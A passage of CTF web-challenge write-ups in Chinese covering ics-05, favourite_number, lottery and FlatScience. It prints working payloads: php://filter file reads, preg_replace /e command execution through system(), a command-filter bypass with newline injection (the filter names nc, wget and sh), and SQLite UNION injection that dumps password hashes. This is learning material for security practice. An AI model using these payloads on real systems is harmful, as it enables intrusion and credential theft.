<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@&#x2F;opt&#x2F;apt&#x2F;database.sqlite3</span><br><span class="line"># 根据Django的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息</span><br></pre></td></tr></table></figure>
<p>又返回一长串html，用网页打开后搜索ctf，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHCTF&#123;yoooo_Such_A_G00D_@&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><p>Django目录下一般有一个settings.py用于设置网站数据库路径（默认使用sqlites)</p>
<p>所以也可以读取settings.py</p>
<h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>考察：文件包含漏洞；PHP下远程调用命令行</p>
<p>首先进入网页，发现只有“设备维护中心可以进入”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45075&#x2F;index.php</span><br></pre></td></tr></table></figure>
<p>进入后，再点击左上角的云平台设备维护中心，URL变成如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45075&#x2F;index.php?page&#x3D;index</span><br></pre></td></tr></table></figure>
<p>此处为明显的文件注入漏洞，通过php://伪协议下载index.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45075&#x2F;index.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p>下载出来后是base64编码，还原后得到index.php，关键函数为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern &#x3D; $_GET[pat];</span><br><span class="line">    $replacement &#x3D; $_GET[rep];</span><br><span class="line">    $subject &#x3D; $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解读：如果HTTP_X_FOWARDED_FOR为127.0.0.1，则执行preg_replace。</p>
<p>首先在报文Header处添加X_Forwarded_For:127.0.0.1，得以看到“Welcome My Admin ! ”</p>
<p>然后根据preg_replace的/e漏洞，修改报文后发送，可以得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php?pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(&quot;ls&quot;)&amp;sub&#x3D;defg%20abc HTTP&#x2F;1.1  </span><br><span class="line">&#x2F;*index.html</span><br><span class="line">index.php</span><br><span class="line">js</span><br><span class="line">layui</span><br><span class="line">logo.png</span><br><span class="line">s3chahahaDir</span><br><span class="line">start.sh</span><br><span class="line">视图.png</span><br><span class="line">*&#x2F;</span><br><span class="line">GET &#x2F;index.php?pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(&quot;find+-iname+flag&quot;)&amp;sub&#x3D;defg%20abc HTTP&#x2F;1.1 # # +在PHP的URL解析中代表空格</span><br><span class="line">&#x2F;*.&#x2F;s3chahahaDir&#x2F;flag*&#x2F;</span><br><span class="line">GET &#x2F;index.php?pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(&quot;cd+.&#x2F;s3chahahaDir&#x2F;flag%26%26+cat+flag.php&quot;)&amp;sub&#x3D;defg%20abc HTTP&#x2F;1.1 # %26在PHP的URL解析中代表&amp;，而在命令行中，&amp;&amp;代表前面的语句执行成功后，执行后面的语句</span><br><span class="line">&#x2F;*得到flag*&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;d46915710af3a6e405b68271d55edd82&#125;</span><br></pre></td></tr></table></figure>
<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php # 可以以base64方式读取文件</span><br></pre></td></tr></table></figure>
<h2 id="PHP中preg-replace的-e漏洞"><a href="#PHP中preg-replace的-e漏洞" class="headerlink" title="PHP中preg_replace的/e漏洞"></a>PHP中preg_replace的/e漏洞</h2><p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向 引用替换完之后）。 提示：要确保 replacement 构成一个合法的 PHP 代码字符串， 否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也就是说只要在subject中有要搜索的pattern的内容，同时将在replacement前加上&#x2F;e，触发&#x2F;e漏洞，就可以执行replacement中的正确的php代码</span><br></pre></td></tr></table></figure>
<h1 id="favourite-number"><a href="#favourite-number" class="headerlink" title="favourite_number"></a>favourite_number</h1><p>考察：php的两个漏洞利用，tac</p>
<p>进入页面就是一段php代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;php5.5.9</span><br><span class="line">$stuff &#x3D; $_POST[&quot;stuff&quot;];</span><br><span class="line">$array &#x3D; [&#39;admin&#39;, &#39;user&#39;];</span><br><span class="line">if($stuff &#x3D;&#x3D;&#x3D; $array &amp;&amp; $stuff[0] !&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">    $num&#x3D; $_POST[&quot;num&quot;];</span><br><span class="line">    if (preg_match(&quot;&#x2F;^\d+$&#x2F;im&quot;,$num))&#123;</span><br><span class="line">        if (!preg_match(&quot;&#x2F;sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#39;|\&quot;|\|&#x2F;i&quot;,$num))&#123;</span><br><span class="line">            echo &quot;my favorite num is:&quot;;</span><br><span class="line">            system(&quot;echo &quot;.$num);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#39;Bonjour!&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即首先要提交一个stuff，绕过stuff的检测，再提交一个num，num绕过preg_match的检测并执行命令</p>
<p>stuff绕过利用了php5.5.26的这个漏洞<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=69892">https://bugs.php.net/bug.php?id=69892</a></p>
<p>提交URL的post data为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1</span><br></pre></td></tr></table></figure>
<p>输出了1，接下来要绕过num的检测。接下来要绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&quot;&#x2F;^\d+$&#x2F;im&quot;,$num)</span><br></pre></td></tr></table></figure>
<p>需要用%0a进行跨行匹配，故payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1%0als</span><br></pre></td></tr></table></figure>
<p>可以看到在根目录下有flag</p>
<p>由于cat有绕过，因此使用其他的查看文件方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">方法1：tcat+inode</span><br><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1%0atac ls -i ## 查看flag文件的inode号</span><br><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1%0atac &#96;find &#x2F; -inum 38274922&#96; ## 反引号用于绕过单双引号过滤</span><br><span class="line">方法2：将文件名输入到文件，然后执行文件</span><br><span class="line">printf &#x2F;fla &gt; &#x2F;tmp&#x2F;hello &amp;&amp; printf g &gt;&gt; &#x2F;tmp&#x2F;hello &amp;&amp; tac &#96;tac &#x2F;tmp&#x2F;hello&#96;</span><br><span class="line">cyberpeace&#123;c4a2094df61c50b15a72dc9b97bc7716&#125; </span><br></pre></td></tr></table></figure>
<h2 id="php5-5-9的溢出漏洞"><a href="#php5-5-9的溢出漏洞" class="headerlink" title="php5.5.9的溢出漏洞"></a>php5.5.9的溢出漏洞</h2><p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=69892">https://bugs.php.net/bug.php?id=69892</a></p>
<p>4294967296=2^32</p>
<h2 id="php下preg-match的绕过方法"><a href="#php下preg-match的绕过方法" class="headerlink" title="php下preg_match的绕过方法"></a>php下preg_match的绕过方法</h2><p>数组绕过：传入的对象是数组时，返回false</p>
<p>换行符绕过：.不匹配换行符，$会忽略句尾的%0a</p>
<h2 id="Linux下查看文件内容的方法"><a href="#Linux下查看文件内容的方法" class="headerlink" title="Linux下查看文件内容的方法"></a>Linux下查看文件内容的方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat、tac、more、less、head、tail、nl</span><br></pre></td></tr></table></figure>
<p>当文件名也被注释时，使用inode可以索引文件</p>
<p>首先用ls -i查找flag编号</p>
<p>或者可以使用文件名输入到文件，然后执行文件的方法</p>
<h1 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h1><p>考察：代码审计</p>
<p>跳过了用githack下载的步骤，题目直接给出了源文件</p>
<p>审计文件，发现在api.php中出现了flag字样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$flag_price</span>;</span><br><span class="line"></span><br><span class="line">	require_registered();</span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$money</span> &lt; <span class="variable">$flag_price</span>)&#123;</span><br><span class="line">		response_error(<span class="string">&#x27;you don\&#x27; have enough money&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$money</span> -= <span class="variable">$flag_price</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">		<span class="variable">$msg</span> = <span class="string">&#x27;Here is your flag: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">		response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="variable">$msg</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而$money是一个session中的值，<strong>无法修改</strong></p>
<p>又找到了负责跳转的部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="variable">$data</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;buy&#x27;</span>:</span><br><span class="line">		require_keys(<span class="variable">$data</span>, [<span class="string">&#x27;numbers&#x27;</span>]);</span><br><span class="line">		buy(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;flag&#x27;</span>:</span><br><span class="line">		flag(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;register&#x27;</span>:</span><br><span class="line">		require_keys(<span class="variable">$data</span>, [<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">		register(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		response_error(<span class="string">&#x27;invalid request&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用burp抓包后，包类似于如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;api.php HTTP&#x2F;1.1</span><br><span class="line">Host: 220.249.52.134:51525</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http:&#x2F;&#x2F;220.249.52.134:51525&#x2F;buy.php</span><br><span class="line">Content-Length: 64</span><br><span class="line">Cookie: PHPSESSID&#x3D;teiedeaf2vra9rrn9ipttquv36</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;action&quot;:&quot;flag&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span><br></pre></td></tr></table></figure>
<p>同时，在buy下，有这么一个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	<span class="variable">$win_numbers</span> = random_win_nums();</span><br><span class="line">	<span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">			<span class="variable">$same_count</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">	response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逻辑为“用钱买彩票”</p>
<p>而判断是否中奖，用的是php中的宽等于，因此可以使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span><br></pre></td></tr></table></figure>
<p>不断中奖，在中奖是$money的值也会提高</p>
<p>在$money超过$flag_money后，可以修改action为flag，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;9491ec43e58eb3d07479508a0c48781e&#125;</span><br></pre></td></tr></table></figure>
<h1 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h1><p>考察：代码审计，sqlite注入，爬虫、python的pdfminer库</p>
<p>首先进入页面，大概就是在不同的目录下载论文的功能。</p>
<p>使用御剑进行扫描，存在admin.php和login.php，分别登陆</p>
<p>尝试用sqlmap进行注入，时间过长 ，放弃</p>
<p>查看网页源代码，在login.php中存在以下注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</span><br></pre></td></tr></table></figure>
<p>尝试访问url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;220.249.52.134:40279&#x2F;login.php?debug</span><br></pre></td></tr></table></figure>
<p>获得源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 4.01&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">blockquote &#123; background: #eeeeee; &#125;</span><br><span class="line">h1 &#123; border-bottom: solid black 2px; &#125;</span><br><span class="line">h2 &#123; border-bottom: solid black 1px; &#125;</span><br><span class="line">.comment &#123; color: darkgreen; &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;iso-8859-1&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align&#x3D;right class&#x3D;lastmod&gt;</span><br><span class="line">Last Modified: Fri Mar  31:33:7 UTC 1337</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;h1&gt;Login&lt;&#x2F;h1&gt;</span><br><span class="line">Login Page, do not try to hax here plox!&lt;br&gt;</span><br><span class="line">&lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">  ID:&lt;br&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;usr&quot;&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  Password:&lt;br&gt; </span><br><span class="line">  &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;pw&quot;&gt;</span><br><span class="line">  &lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#39;usr&#39;]) &amp;&amp; isset($_POST[&#39;pw&#39;]))&#123;</span><br><span class="line">        $user &#x3D; $_POST[&#39;usr&#39;];</span><br><span class="line">        $pass &#x3D; $_POST[&#39;pw&#39;];</span><br><span class="line">        $db &#x3D; new SQLite3(&#39;..&#x2F;fancy.db&#39;);</span><br><span class="line">        $res &#x3D; $db-&gt;query(&quot;SELECT id,name from Users where name&#x3D;&#39;&quot;.$user.&quot;&#39; and password&#x3D;&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);</span><br><span class="line">    if($res)&#123;</span><br><span class="line">        $row &#x3D; $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;br&gt;Some Error occourred!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if(isset($row[&#39;id&#39;]))&#123;</span><br><span class="line">            setcookie(&#39;name&#39;,&#39; &#39;.$row[&#39;name&#39;], time() + 60, &#39;&#x2F;&#39;);</span><br><span class="line">            header(&quot;Location: &#x2F;&quot;);</span><br><span class="line">            die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获得信息有：数据库为sqlite；在name处注入（即usr变量），会在setcookie中呈现相应结果</p>
<p>分别post以下参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usr&#x3D;&#39; union order by 3--+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select name,sql from sqlite_master--+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select 1,group_concat(name) from users --+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select 1,password from users where name&#x3D;admin--+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select 1,group_concat(hint) from users--+&amp;pw&#x3D;123</span><br></pre></td></tr></table></figure>
<p>可以得到admin的密码为3fab54a50e770d830c0416df817567662a9dc85c</p>
<p>而hint的内容提示密码在pdf中，</p>
<p>在login.php下，提示密码的构成方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; $db-&gt;query(&quot;SELECT id,name from Users where name&#x3D;&#39;&quot;.$user.&quot;&#39; and password&#x3D;&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);</span><br></pre></td></tr></table></figure>
<p>使用python下的pdfminer库读取，找到sha1(str.”Salz!”)后等于admin密码的那一段，即为，这个随便抄一个代码就行</p>
<p>密码为ThinJerboa</p>
<p>进入admin.php，提交密码后得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sqlite小知识"><a href="#sqlite小知识" class="headerlink" title="sqlite小知识"></a>sqlite小知识</h2><p>sql中存在一个sqlite_master表，类似于mysql中的information_schema，拥有字段type/name/tbl_name/rootpage/sql</p>
